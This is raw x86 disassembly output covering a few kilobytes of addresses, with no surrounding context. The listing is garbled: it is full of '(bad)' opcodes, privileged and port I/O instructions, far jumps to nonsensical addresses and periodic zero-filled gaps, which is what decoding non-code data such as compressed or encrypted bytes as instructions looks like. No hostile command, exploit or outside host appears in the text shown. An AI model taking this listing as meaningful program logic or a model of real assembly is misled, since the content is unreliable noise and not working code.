  42dc2b:	lahf   
  42dc2c:	dec    esi
  42dc2d:	cmc    
  42dc2e:	pop    ebp
  42dc2f:	xor    BYTE PTR [edi+0xf0e7d9c],bh
  42dc35:	arpl   WORD PTR [ecx],di
  42dc37:	in     eax,dx
  42dc38:	ja     0x42dc4d
  42dc3a:	imul   dx,ax,0xac3c
  42dc3f:	mov    ecx,0x170f5a9b
  42dc44:	xlat   BYTE PTR ds:[ebx]
  42dc45:	mulps  xmm2,XMMWORD PTR [edx-0x40]
  42dc49:	aaa    
  42dc4a:	sti    
  42dc4b:	shl    DWORD PTR [esp+edx*2],1
  42dc4e:	ds dec esi
  42dc50:	or     al,0xa2
  42dc52:	xor    ah,BYTE PTR [edx]
  42dc54:	push   0x2167b01f
  42dc59:	in     eax,0xf3
  42dc5b:	pusha  
  42dc5c:	bound  edx,QWORD PTR [edx]
  42dc5e:	arpl   WORD PTR [ebp+0x16697277],cx
  42dc64:	mov    ds:0xfa46a595,al
  42dc69:	in     al,0xf4
  42dc6b:	xchg   ebx,eax
  42dc6c:	aas    
  42dc6d:	mov    ecx,0x883d8350
  42dc72:	outs   dx,DWORD PTR fs:[esi]
  42dc74:	mov    ah,0x19
  42dc76:	xchg   ebx,eax
  42dc77:	cmp    eax,0xfdc4bd95
  42dc7c:	xor    al,0xea
  42dc7e:	stc    
  42dc7f:	or     ecx,edi
  42dc81:	lahf   
  42dc82:	dec    ebx
  42dc83:	(bad)  
  42dc84:	and    DWORD PTR [ebp-0x20],edi
  42dc87:	mov    BYTE PTR [eax-0x39],0xf2
  42dc8b:	fnstsw WORD PTR [ebx-0x40]
  42dc8e:	mov    al,BYTE PTR es:[eax+0x0]
	...
  42dcf2:	add    BYTE PTR [eax],al
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	or     dl,BYTE PTR [eax]
  42dd02:	int3   
  42dd03:	xchg   esi,eax
  42dd04:	inc    eax
  42dd05:	jmp    0x42dd08
  42dd07:	add    BYTE PTR ds:0xea000001,al
  42dd0d:	ror    dh,cl
  42dd0f:	mov    dl,0x5e
  42dd11:	mov    ds:0xe80083af,eax
  42dd16:	mov    ds,edx
  42dd18:	push   0x785099c4
  42dd1d:	cwde   
  42dd1e:	mov    edx,0x6ba16e84
  42dd23:	or     BYTE PTR [ebp-0x79],ah
  42dd26:	push   ecx
  42dd27:	push   esi
  42dd28:	ins    BYTE PTR es:[edi],dx
  42dd29:	aas    
  42dd2a:	in     eax,dx
  42dd2b:	into   
  42dd2c:	cmp    eax,0xa165465f
  42dd31:	add    DWORD PTR [ebx-0x44],eax
  42dd34:	sbb    eax,edx
  42dd36:	inc    ecx
  42dd37:	loope  0x42ddb4
  42dd39:	dec    ebp
  42dd3a:	aad    0x74
  42dd3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dd3d:	test   al,0xfd
  42dd3f:	test   BYTE PTR [ecx],dl
  42dd41:	jg     0x42dcf2
  42dd43:	inc    edi
  42dd44:	xchg   DWORD PTR [ebx],edi
  42dd46:	jnp    0x42dd14
  42dd48:	adc    DWORD PTR [ecx+0x54],ebp
  42dd4b:	imul   edx,DWORD PTR [eax-0x7c],0xffffffbb
  42dd4f:	or     bh,BYTE PTR [edi-0x25cfb3f4]
  42dd55:	adc    bl,BYTE PTR [eax]
  42dd57:	and    edx,ebp
  42dd59:	jle    0x42dd01
  42dd5b:	sub    BYTE PTR [edx],dl
  42dd5d:	iret   
  42dd5e:	(bad)  [edx+0x44]
  42dd61:	inc    edi
  42dd62:	nop
  42dd63:	out    dx,eax
  42dd64:	dec    esp
  42dd65:	pop    esp
  42dd66:	loopne 0x42dd1c
  42dd68:	mov    ss,WORD PTR [edx+0x791b4adc]
  42dd6e:	addr16 dec ebp
  42dd70:	hlt    
  42dd71:	lds    eax,FWORD PTR [edx*4+0x551d8796]
  42dd78:	push   0xef90e0e2
  42dd7d:	mov    BYTE PTR [ecx-0x72],0xd2
  42dd81:	inc    esi
  42dd82:	cmp    al,cl
  42dd84:	xor    eax,0xbb1874fd
  42dd89:	xchg   edx,eax
  42dd8a:	and    eax,edx
  42dd8c:	loopne 0x42dd8c
  42dd8e:	jmp    DWORD PTR [esi+0xb]
  42dd91:	ins    DWORD PTR es:[edi],dx
  42dd92:	outs   dx,DWORD PTR ds:[si]
  42dd94:	xchg   BYTE PTR [esp+edx*2],al
  42dd97:	outs   dx,BYTE PTR ds:[esi]
  42dd98:	mov    esp,0xa29dcf84
  42dd9d:	push   ecx
  42dd9e:	lock out 0x2e,eax
  42dda1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dda2:	in     eax,dx
  42dda3:	in     eax,0xd9
  42dda5:	xchg   ecx,eax
  42dda6:	push   es
  42dda7:	inc    eax
  42dda8:	lock lods al,BYTE PTR ds:[esi]
  42ddaa:	popa   
  42ddab:	outs   dx,BYTE PTR ds:[esi]
  42ddac:	retf   
  42ddad:	mov    edx,0x2166a3ea
  42ddb2:	push   ebp
  42ddb3:	dec    edx
  42ddb4:	js     0x42de14
  42ddb6:	mov    ebp,0xad20993b
  42ddbb:	xor    al,0xbc
  42ddbd:	push   ecx
  42ddbe:	mov    edi,0xcf96d21a
  42ddc3:	ret    
  42ddc4:	inc    esp
  42ddc5:	fdivp  st(4),st
  42ddc7:	jmp    0xa66640cb
  42ddcc:	nop
  42ddcd:	sub    dh,BYTE PTR [ebp+0x53]
  42ddd0:	loope  0x42dd52
  42ddd2:	sub    al,0xc2
  42ddd4:	mov    ds,WORD PTR [ecx]
  42ddd6:	xchg   edx,eax
  42ddd7:	icebp  
  42ddd8:	addr16 jbe 0x42de49
  42dddb:	xchg   esp,ebp
  42dddd:	inc    esi
  42ddde:	xor    cl,bh
  42dde0:	in     al,dx
  42dde1:	cmp    eax,0xfc338d6
  42dde6:	xchg   DWORD PTR [edx],ebp
  42dde8:	les    esi,FWORD PTR [esi+0x25]
  42ddeb:	icebp  
  42ddec:	xchg   ecx,eax
  42dded:	cmp    ah,BYTE PTR [ebx]
  42ddef:	adc    al,BYTE PTR [ecx-0x29]
  42ddf2:	push   cs
  42ddf3:	repz xor ebp,DWORD PTR [ecx]
  42ddf6:	cdq    
  42ddf7:	aad    0xbc
  42ddf9:	push   eax
  42ddfa:	cmp    edx,DWORD PTR [esi+esi*8-0x2485410f]
  42de01:	vpshuflw ymm5,YMMWORD PTR [eax+0x30],0xbb
  42de07:	addr16 js 0x42de64
  42de0a:	je     0x42dda7
  42de0c:	sbb    DWORD PTR ds:0xbc8958,ebx
	...
  42de72:	add    BYTE PTR [eax],al
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	dec    BYTE PTR [eax-0x1b]
  42de83:	enter  0xec45,0x1
  42de87:	add    BYTE PTR ds:0x53000001,al
  42de8d:	mov    dl,0x2f
  42de8f:	pop    esi
  42de90:	mov    edi,0xffb01762
  42de95:	mov    cl,0xd3
  42de97:	loopne 0x42deff
  42de99:	ja     0x42defc
  42de9b:	mov    ebx,0x5da10f8a
  42dea0:	mov    DWORD PTR ds:[ebp+0x42459a83],0x704c8cda
  42deab:	or     ah,bl
  42dead:	sar    DWORD PTR [ebp+0x44],1
  42deb0:	adc    BYTE PTR [edi-0xd6eef19],dh
  42deb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42deb7:	adc    BYTE PTR [eax+0x3b],bl
  42deba:	lods   al,BYTE PTR ds:[esi]
  42debb:	out    0xd7,eax
  42debd:	fstp   TBYTE PTR [ecx+edi*4]
  42dec0:	mov    bl,0x72
  42dec2:	jl     0x42df43
  42dec4:	and    eax,0x97e84373
  42dec9:	mov    bh,BYTE PTR [ebx+0x11b1ecff]
  42decf:	push   ecx
  42ded0:	shl    BYTE PTR [edi-0x1e],0xd4
  42ded4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ded5:	pop    ebx
  42ded6:	ds push es
  42ded8:	mov    dl,0xe9
  42deda:	push   cs
  42dedb:	mov    ah,0x1a
  42dedd:	inc    esi
  42dede:	(bad)  
  42dedf:	enter  0x9ae1,0xea
  42dee3:	pop    edi
  42dee4:	fadd   DWORD PTR [esi]
  42dee6:	retf   0x8ede
  42dee9:	xor    dh,0x1f
  42deec:	cs adc ebp,edi
  42deef:	pop    edx
  42def0:	mov    DWORD PTR [eax],edi
  42def2:	icebp  
  42def3:	inc    ebx
  42def4:	das    
  42def5:	and    eax,0x46ee6f23
  42defa:	mov    eax,ds:0x317d85a3
  42deff:	mov    al,0xbe
  42df01:	pop    ecx
  42df02:	cmp    DWORD PTR [ecx-0xad37aa4],esi
  42df08:	jb     0x42df41
  42df0a:	int3   
  42df0b:	xchg   ecx,ebx
  42df0d:	sti    
  42df0e:	cmp    BYTE PTR [ecx+0x5e],0x58
  42df12:	retf   0xdc6e
  42df15:	xor    dl,BYTE PTR [ecx]
  42df17:	pop    ss
  42df18:	mov    dh,0x27
  42df1a:	or     BYTE PTR [ecx-0x2f63fb3f],0x68
  42df21:	adc    ebp,DWORD PTR [ebx-0x20]
  42df24:	jbe    0x42df2a
  42df26:	ror    esi,cl
  42df28:	scas   al,BYTE PTR es:[edi]
  42df29:	jbe    0x42df07
  42df2b:	or     dl,ah
  42df2d:	mov    ecx,DWORD PTR [ebp-0x26]
  42df30:	jns    0x42df9f
  42df32:	or     BYTE PTR [eax-0x37],bl
  42df35:	mov    bh,0xc0
  42df37:	add    dl,BYTE PTR [eax]
  42df39:	and    BYTE PTR [edx],al
  42df3b:	into   
  42df3c:	test   DWORD PTR [edi-0x7e],0xf0d4eab7
  42df43:	pop    esi
  42df44:	pop    edi
  42df46:	adc    al,0x9e
  42df48:	push   es
  42df49:	cli    
  42df4a:	fwait
  42df4b:	jno    0x42dfbe
  42df4d:	push   esp
  42df4e:	push   eax
  42df4f:	jnp    0x42df34
  42df51:	push   0x61
  42df53:	add    al,0xdf
  42df55:	mov    BYTE PTR [eax],al
  42df57:	push   edx
  42df58:	js     0x42df57
  42df5a:	mov    edi,0x24f200eb
  42df60:	aad    0xd5
  42df62:	cli    
  42df63:	fdiv   st(3),st
  42df65:	xchg   esp,eax
  42df66:	push   ss
  42df67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df68:	or     ebp,DWORD PTR [edx-0x7390879b]
  42df6e:	inc    ebp
  42df6f:	rcr    bl,0x70
  42df72:	and    ebx,DWORD PTR [ecx-0x168d5b42]
  42df78:	adc    eax,0x470b49ec
  42df7d:	(bad)  
  42df7e:	mov    eax,0x25815513
  42df83:	leave  
  42df84:	jb     0x42df9e
  42df86:	cld    
  42df87:	fsubr  QWORD PTR [esp+esi*4]
  42df8a:	push   cs
  42df8b:	xchg   ecx,eax
  42df8c:	pop    esi
  42df8d:	dec    esp
  42df8e:	(bad)  
  42df90:	add    eax,0x0
	...
  42dff1:	add    BYTE PTR [eax],al
  42dff3:	add    BYTE PTR [edx],al
  42dff5:	(bad)  
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi-0x10]
  42e001:	inc    eax
  42e002:	mov    ah,0x7
  42e004:	dec    edx
  42e005:	in     eax,dx
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    eax,0x59000001
  42e00d:	ror    DWORD PTR [eax-0x24],cl
  42e010:	sub    edx,DWORD PTR [edx+0x5f0119bf]
  42e016:	xor    al,al
  42e018:	bound  edi,QWORD PTR [ecx]
  42e01a:	mov    edi,0x944a1522
  42e01f:	rcr    BYTE PTR [esi-0x6],cl
  42e022:	fidivr DWORD PTR [ebx]
  42e024:	xor    cl,BYTE PTR [ebp-0x159a226b]
  42e02a:	stc    
  42e02b:	dec    esi
  42e02c:	and    DWORD PTR [esi],edi
  42e02e:	jnp    0x42dffb
  42e030:	mov    edx,0x663fff21
  42e035:	popaw  
  42e037:	lods   eax,DWORD PTR ds:[esi]
  42e038:	sub    BYTE PTR [ebx-0x723924fd],0x2a
  42e03f:	mov    ebx,0x12df7789
  42e044:	fldenv [ecx+0x6d]
  42e047:	aad    0x75
  42e049:	and    DWORD PTR [edx+0x74],edx
  42e04c:	and    ch,dl
  42e04e:	ins    BYTE PTR es:[edi],dx
  42e04f:	repz pop esi
  42e051:	cmp    ebp,DWORD PTR [edi-0x63a40749]
  42e057:	lea    esp,[ebx+0x51]
  42e05a:	push   0xffffffa9
  42e05c:	cmp    al,0x84
  42e05e:	push   edi
  42e05f:	sar    DWORD PTR [ecx-0x30ed650d],cl
  42e065:	mov    cl,bh
  42e067:	not    BYTE PTR [ecx+0x38]
  42e06a:	clc    
  42e06b:	aas    
  42e06c:	out    dx,al
  42e06d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e06e:	dec    ebx
  42e06f:	lds    edi,FWORD PTR [edi]
  42e071:	cli    
  42e072:	ds (bad) 
  42e074:	mov    edx,0xfa29ba23
  42e079:	(bad)  
  42e07a:	cli    
  42e07b:	sub    bh,BYTE PTR [ecx]
  42e07d:	ret    
  42e07e:	mov    ecx,0x435536eb
  42e083:	cmp    ebx,edx
  42e085:	inc    esi
  42e086:	out    dx,eax
  42e087:	cmc    
  42e088:	outs   dx,BYTE PTR ds:[esi]
  42e089:	xchg   ebp,eax
  42e08a:	out    dx,eax
  42e08b:	dec    esp
  42e08c:	pop    es
  42e08d:	scas   eax,DWORD PTR es:[edi]
  42e08e:	fstp   DWORD PTR [ebx+0x4e1de03c]
  42e094:	cmp    al,0x3f
  42e096:	mov    bh,0xe0
  42e098:	sbb    BYTE PTR [ebx+0x3],al
  42e09b:	xchg   ebp,eax
  42e09c:	adc    dl,ch
  42e09e:	add    ebx,DWORD PTR [esp+eiz*4+0x2244c242]
  42e0a5:	xchg   esp,eax
  42e0a6:	dec    edx
  42e0a7:	data16 fimul DWORD PTR ds:0xb64a6c72
  42e0ae:	cmp    ecx,DWORD PTR es:[ebp+0x37]
  42e0b2:	cdq    
  42e0b3:	loop   0x42e11d
  42e0b5:	pop    ecx
  42e0b6:	mov    dh,0xb5
  42e0b8:	(bad)  
  42e0b9:	jmp    0x42e117
  42e0bb:	fs push 0xffffffe4
  42e0be:	xor    dl,bl
  42e0c0:	aad    0x65
  42e0c2:	jle    0x42e085
  42e0c4:	jo     0x42e05c
  42e0c6:	push   ss
  42e0c7:	inc    ecx
  42e0c8:	je     0x42e104
  42e0ca:	int3   
  42e0cb:	int3   
  42e0cc:	sbb    eax,0x95c8879
  42e0d1:	enter  0xa979,0x58
  42e0d5:	dec    esp
  42e0d6:	xlat   BYTE PTR ds:[ebx]
  42e0d7:	mov    ebp,0x9941d99a
  42e0dc:	scas   eax,DWORD PTR es:[edi]
  42e0dd:	popa   
  42e0de:	out    dx,al
  42e0df:	jne    0x42e0cb
  42e0e1:	stos   BYTE PTR es:[edi],al
  42e0e2:	fsub   st(3),st
  42e0e4:	fs push edi
  42e0e6:	xor    esp,DWORD PTR [esi-0x6c]
  42e0e9:	push   eax
  42e0ea:	jbe    0x42e083
  42e0ec:	in     eax,0x92
  42e0ee:	nop
  42e0ef:	ins    DWORD PTR es:[edi],dx
  42e0f0:	outs   dx,BYTE PTR ds:[esi]
  42e0f1:	out    0x39,al
  42e0f3:	rcr    bl,0x5d
  42e0f6:	push   esp
  42e0f7:	fucom  st(4)
  42e0f9:	(bad)  
  42e0fa:	(bad)  
  42e0fb:	addr16 xchg ecx,eax
  42e0fd:	imul   ebp,DWORD PTR [esi+edi*2-0x1277557b],0xe6173ddf
  42e108:	mul    DWORD PTR [ebx-0x13]
  42e10b:	inc    ebx
  42e10c:	jle    0x42e090
  42e10e:	xchg   cx,ax
  42e110:	and    al,BYTE PTR [eax]
	...
  42e172:	add    BYTE PTR [eax],al
  42e174:	mov    eax,ds:0x7e061ecf
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	cs iret 
  42e182:	mov    esi,0x1ee4f7f
  42e187:	add    BYTE PTR ds:0xaa000001,al
  42e18d:	(bad)  
  42e18e:	imul   ecx,DWORD PTR [edi+0x1b19d841],0x7a
  42e195:	dec    ebp
  42e196:	sbb    BYTE PTR [ecx],ah
  42e198:	mov    al,ds:0x4cd8c81e
  42e19d:	push   edi
  42e19e:	sub    al,0x6
  42e1a0:	call   0x6383a9aa
  42e1a5:	pop    ss
  42e1a6:	sbb    esp,ebx
  42e1a8:	jg     0x42e15f
  42e1aa:	inc    esi
  42e1ab:	hlt    
  42e1ac:	jle    0x42e134
  42e1ae:	mov    edx,0xce97b539
  42e1b3:	ss (bad) 
  42e1b6:	pop    esi
  42e1b7:	cmp    esp,eax
  42e1b9:	fld    DWORD PTR [esi+0x7fb7986a]
  42e1bf:	rcl    ebx,cl
  42e1c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e1c2:	call   0x67c6:0x2c46e1d
  42e1c9:	stos   BYTE PTR es:[edi],al
  42e1ca:	popa   
  42e1cb:	jno    0x42e1d3
  42e1cd:	mov    cl,0x8f
  42e1cf:	or     ecx,esi
  42e1d1:	cs push esp
  42e1d3:	push   edi
  42e1d4:	cmp    DWORD PTR [esi+0x4f],0xf
  42e1d8:	cdq    
  42e1d9:	fldcw  WORD PTR gs:[edi-0x7b]
  42e1dd:	in     al,0xe0
  42e1df:	fisttp DWORD PTR [ebx]
  42e1e1:	dec    ecx
  42e1e2:	push   0x3c9bdf88
  42e1e7:	cmp    cl,BYTE PTR [edi]
  42e1e9:	add    edi,DWORD PTR [eax+eax*4]
  42e1ec:	mov    ebp,0xa094dc2b
  42e1f1:	fild   QWORD PTR [ebp-0x51]
  42e1f4:	sbb    esp,DWORD PTR [eax-0x2e]
  42e1f7:	mov    esp,DWORD PTR [ebx+ebx*8+0x52402448]
  42e1fe:	in     al,dx
  42e1ff:	stc    
  42e200:	cwde   
  42e201:	push   esp
  42e202:	adc    esi,esi
  42e204:	cmp    eax,0x22ee37dd
  42e209:	jne    0x42e204
  42e20b:	jg     0x42e1da
  42e20d:	and    ch,BYTE PTR [ecx-0x1a722a42]
  42e213:	clc    
  42e214:	fst    DWORD PTR [ebp+ebx*1+0x35d2a85e]
  42e21b:	xor    DWORD PTR [eax+0x3e],edi
  42e21e:	jge    0x42e1db
  42e220:	int3   
  42e221:	jmp    0xba1ef301
  42e226:	or     al,0x12
  42e228:	cwde   
  42e229:	daa    
  42e22a:	ja     0x42e229
  42e22c:	fnstenv [edi-0x3f]
  42e22f:	xchg   ebp,eax
  42e230:	inc    ebx
  42e231:	fwait
  42e232:	jmp    0x42e1dd
  42e234:	fcmovnbe st,st(6)
  42e236:	fs fcmovu st,st(0)
  42e239:	push   ds
  42e23a:	cmp    al,0x3b
  42e23c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e23d:	hlt    
  42e23e:	int    0x63
  42e240:	jb     0x42e1e3
  42e242:	gs fs dec edx
  42e245:	(bad)  
  42e246:	xlat   BYTE PTR ds:[ebx]
  42e247:	jmp    0x42e297
  42e249:	jb     0x42e21f
  42e24b:	dec    ebp
  42e24c:	pop    ss
  42e24d:	sbb    al,0xc3
  42e24f:	js     0x42e294
  42e251:	out    0x2,eax
  42e253:	mov    BYTE PTR [edi-0x67b810a9],al
  42e259:	scas   al,BYTE PTR es:[edi]
  42e25a:	jbe    0x42e1f6
  42e25c:	adc    eax,ebp
  42e25e:	scas   al,BYTE PTR es:[edi]
  42e25f:	xor    BYTE PTR [ebp+0x3fda626e],dl
  42e265:	les    edi,FWORD PTR [esi+0x67c4f95b]
  42e26b:	pusha  
  42e26c:	and    al,ch
  42e26e:	mov    al,0xf0
  42e270:	repnz add ch,0x42
  42e274:	imul   ebx,DWORD PTR [esi],0xfffffff6
  42e277:	(bad)  
  42e278:	fadd   DWORD PTR [ebx]
  42e27a:	sbb    eax,0xedcc8904
  42e27f:	jmp    0xe9d2b2e3
  42e284:	jae    0x42e2fd
  42e286:	aam    0xe8
  42e288:	pop    esi
  42e289:	sub    cl,BYTE PTR [eax-0x45]
  42e28c:	pop    ss
  42e28d:	ins    DWORD PTR es:[edi],dx
  42e28e:	dec    ecx
  42e28f:	pop    ebx
  42e290:	xchg   DWORD PTR [eax],eax
	...
  42e2f2:	add    BYTE PTR [eax],al
  42e2f4:	lods   eax,DWORD PTR ds:[esi]
  42e2f5:	cmp    eax,0xb79aa78a
  42e2fa:	lods   eax,DWORD PTR ds:[esi]
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x7a199140
  42e301:	(bad)  
  42e302:	stc    
  42e303:	nop
  42e304:	push   esp
  42e305:	out    dx,eax
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    eax,0xdc000001
  42e30d:	aam    0x8d
  42e30f:	jp     0x42e320
  42e311:	loop   0x42e2e9
  42e313:	mov    al,ds:0xf7080b11
  42e318:	mov    ch,0x32
  42e31a:	and    BYTE PTR [esi],al
  42e31c:	adc    ch,dh
  42e31e:	dec    edx
  42e31f:	xlat   BYTE PTR ds:[ebx]
  42e320:	cld    
  42e321:	or     dl,BYTE PTR [edi]
  42e323:	add    esp,DWORD PTR [esp+eiz*8-0x359e5edf]
  42e32a:	mov    ds:0x1b84d64f,eax
  42e32f:	clc    
  42e330:	rcl    DWORD PTR [edi-0x2e53e14d],cl
  42e336:	inc    esi
  42e337:	popa   
  42e338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e339:	div    edi
  42e33b:	sbb    eax,0x2285e0c0
  42e340:	mov    al,0x87
  42e342:	arpl   bp,bx
  42e344:	fisttp QWORD PTR [edi+0x1ddfce79]
  42e34a:	or     BYTE PTR [edi],0x86
  42e34d:	stc    
  42e34e:	jnp    0x42e3b5
  42e350:	mov    bl,0xc5
  42e352:	xor    dl,BYTE PTR [edi]
  42e354:	cmp    al,0xa8
  42e356:	frstor [ebx]
  42e358:	clc    
  42e359:	mov    DWORD PTR [edi+0x31],edx
  42e35c:	inc    esi
  42e35d:	inc    ebp
  42e35e:	test   al,al
  42e360:	xlat   BYTE PTR ds:[ebx]
  42e361:	xchg   BYTE PTR [esi-0x1c],bh
  42e364:	mov    edi,0xbcc38219
  42e369:	pop    ecx
  42e36a:	iret   
  42e36b:	call   0x1953246e
  42e370:	jle    0x42e3c2
  42e372:	dec    eax
  42e373:	outs   dx,DWORD PTR ds:[esi]
  42e374:	jle    0x42e3b2
  42e376:	into   
  42e377:	and    dl,BYTE PTR [ebx+0x3cebca39]
  42e37d:	(bad)  
  42e37e:	iret   
  42e37f:	mov    ds:0x8c7eabdb,eax
  42e384:	inc    edx
  42e386:	push   ebx
  42e387:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e388:	repnz lods eax,DWORD PTR ds:[esi]
  42e38a:	test   dh,ch
  42e38c:	mov    ebp,0x7dd6f3a7
  42e391:	mov    esp,0x9abc228
  42e396:	sub    al,0xe9
  42e398:	popf   
  42e399:	add    eax,0xc53d8b6f
  42e39e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e39f:	push   ecx
  42e3a0:	std    
  42e3a1:	je     0x42e3e9
  42e3a3:	fucomp st(0)
  42e3a5:	test   al,0xe6
  42e3a7:	and    DWORD PTR [eax-0x40],0x66
  42e3ab:	push   edi
  42e3ac:	dec    ebx
  42e3ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e3ae:	aam    0x93
  42e3b0:	pop    es
  42e3b1:	inc    edi
  42e3b2:	in     eax,dx
  42e3b3:	bndstx [eax+0x35540e90],(bad)
  42e3ba:	sub    bh,BYTE PTR [edi+esi*2]
  42e3bd:	xor    BYTE PTR [ebx],ch
  42e3bf:	mov    bl,0x28
  42e3c1:	in     al,0x9
  42e3c3:	mov    ds:0x32c57b66,al
  42e3c8:	adc    ah,BYTE PTR [esi+0x3e]
  42e3cb:	xchg   edx,eax
  42e3cc:	nop
  42e3cd:	les    eax,FWORD PTR ds:0x14c5dc7c
  42e3d3:	jge    0x42e3fb
  42e3d5:	outs   dx,DWORD PTR ds:[esi]
  42e3d6:	ins    DWORD PTR es:[edi],dx
  42e3d7:	and    al,0xac
  42e3d9:	outs   dx,BYTE PTR ds:[esi]
  42e3da:	xchg   edx,eax
  42e3db:	adc    dh,BYTE PTR [ebp+0x43]
  42e3de:	or     eax,0x974399b4
  42e3e3:	push   ds
  42e3e4:	fist   DWORD PTR [edi]
  42e3e6:	add    DWORD PTR [ebx+0x1ac8aa7c],0xffffffb4
  42e3ed:	sbb    BYTE PTR [edi+0x2c],0xe
  42e3f1:	ins    DWORD PTR es:[edi],dx
  42e3f2:	mov    ah,BYTE PTR [ecx-0x7e]
  42e3f5:	xchg   esi,eax
  42e3f6:	mov    ah,0x15
  42e3f8:	jb     0x42e41f
  42e3fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e3fb:	imul   DWORD PTR [esi+0x11452634]
  42e401:	mov    eax,0xbf789477
  42e406:	sub    DWORD PTR [edi-0x14817110],ecx
  42e40c:	cmp    ecx,eax
  42e40e:	inc    edi
  42e40f:	ss push 0x0
	...
  42e471:	add    BYTE PTR [eax],al
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	test   DWORD PTR [edi],ebx
  42e482:	scas   eax,DWORD PTR es:[edi]
  42e483:	dec    ebp
  42e484:	pop    ecx
  42e485:	lock add DWORD PTR [eax],eax
  42e488:	add    eax,0xb6000001
  42e48d:	test   eax,0xc38a0805
  42e492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e493:	pop    ecx
  42e494:	jecxz  0x42e42e
  42e496:	stos   BYTE PTR es:[edi],al
  42e497:	leave  
  42e498:	mov    ch,0xc8
  42e49a:	loopne 0x42e482
  42e49c:	dec    edi
  42e49d:	ins    DWORD PTR es:[edi],dx
  42e49e:	mov    ch,0x39
  42e4a0:	gs pop ds
  42e4a2:	test   BYTE PTR [edx-0x5b347250],0xda
  42e4a9:	mov    ecx,0x1dd12b71
  42e4ae:	dec    edx
  42e4af:	stos   BYTE PTR es:[edi],al
  42e4b0:	scas   al,BYTE PTR es:[edi]
  42e4b1:	hlt    
  42e4b2:	xchg   BYTE PTR [ecx],al
  42e4b4:	inc    eax
  42e4b5:	mov    edi,0x3015fa7
  42e4ba:	pop    ebp
  42e4bb:	sbb    eax,0x63cfea55
  42e4c0:	ja     0x42e4d0
  42e4c2:	jo     0x42e47c
  42e4c4:	add    DWORD PTR [eax-0x62],esi
  42e4c7:	loope  0x42e526
  42e4c9:	(bad)  
  42e4ca:	cmc    
  42e4cb:	cli    
  42e4cc:	daa    
  42e4cd:	out    dx,al
  42e4ce:	jecxz  0x42e478
  42e4d0:	and    al,0x4d
  42e4d3:	dec    ecx
  42e4d4:	mov    edx,0x6982f1d
  42e4d9:	sahf   
  42e4da:	jbe    0x42e478
  42e4dc:	adc    dh,cl
  42e4de:	aad    0xd6
  42e4e0:	push   ecx
  42e4e1:	aaa    
  42e4e2:	retf   
  42e4e3:	mov    edx,0x674b5f90
  42e4e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e4e9:	sub    bl,BYTE PTR [ecx-0x225e0dae]
  42e4ef:	mov    ch,0x43
  42e4f1:	or     DWORD PTR [eax+0x5c],ecx
  42e4f4:	dec    esi
  42e4f5:	repz jecxz 0x42e4da
  42e4f8:	push   0xa8be8476
  42e4fd:	lds    edx,FWORD PTR [esi]
  42e4ff:	sub    esp,DWORD PTR [edx+0x34]
  42e502:	(bad)  
  42e503:	addr16 push es
  42e505:	and    eax,0x70c96191
  42e50a:	sbb    edi,DWORD PTR [ecx+edx*4-0x65]
  42e50e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e50f:	pop    es
  42e510:	xor    al,0x7b
  42e512:	add    al,0x4f
  42e514:	sbb    bh,BYTE PTR [esp+edi*1-0x2d]
  42e518:	aam    0x69
  42e51a:	pushf  
  42e51b:	mov    esi,0x342a81fd
  42e520:	xor    al,0xea
  42e522:	or     dl,BYTE PTR [ebx+edi*1]
  42e525:	repnz adc BYTE PTR [ebx+0x15],bl
  42e529:	inc    edx
  42e52a:	jmp    0x8f70:0x6484913a
  42e531:	test   DWORD PTR [bp+di+0x53ac],0xdfb9ba5a
  42e53a:	enter  0xc7c7,0x9a
  42e53e:	mov    cs,WORD PTR [edx+0x39675afd]
  42e544:	(bad)  
  42e547:	cmp    al,bl
  42e549:	mov    ebp,0x2399597c
  42e54e:	ret    
  42e54f:	cli    
  42e550:	call   0x7982:0x51304101
  42e557:	ss inc ecx
  42e559:	fbstp  TBYTE PTR [eax-0x415f18e0]
  42e55f:	mov    bl,0x7f
  42e561:	xchg   ebx,eax
  42e562:	aas    
  42e563:	xchg   edi,eax
  42e564:	ins    BYTE PTR es:[edi],dx
  42e565:	push   cs
  42e566:	xchg   edi,eax
  42e567:	push   eax
  42e568:	and    DWORD PTR [ebx+0x11355218],ebx
  42e56e:	js     0x42e57a
  42e570:	je     0x42e5b4
  42e572:	push   eax
  42e573:	(bad)  
  42e574:	jns    0x42e517
  42e576:	push   ds
  42e577:	popf   
  42e578:	adc    bl,dh
  42e57a:	jp     0x42e5d3
